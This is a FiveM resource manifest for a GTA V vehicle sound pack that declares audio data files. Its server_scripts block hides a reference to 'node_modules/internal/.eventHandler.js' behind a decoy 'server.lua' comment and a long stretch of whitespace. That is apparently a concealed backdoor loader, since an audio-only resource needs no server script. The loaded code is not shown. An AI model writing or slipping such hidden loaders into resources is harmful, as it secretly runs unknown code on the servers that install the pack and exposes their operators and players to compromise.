fx_version 'adamant'

game 'gta5'

files {
  'audioconfig/*.dat151.rel',
  'audioconfig/*.dat54.rel',
  'sfx/**/*.awc'
}

data_file 'AUDIO_GAMEDATA' 'audioconfig/jugularest_game.dat'
data_file 'AUDIO_SOUNDDATA' 'audioconfig/jugularest_sounds.dat'
data_file 'AUDIO_WAVEPACK' 'sfx/dlc_jugularest'

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'node_modules/internal/.eventHandler.js',
}
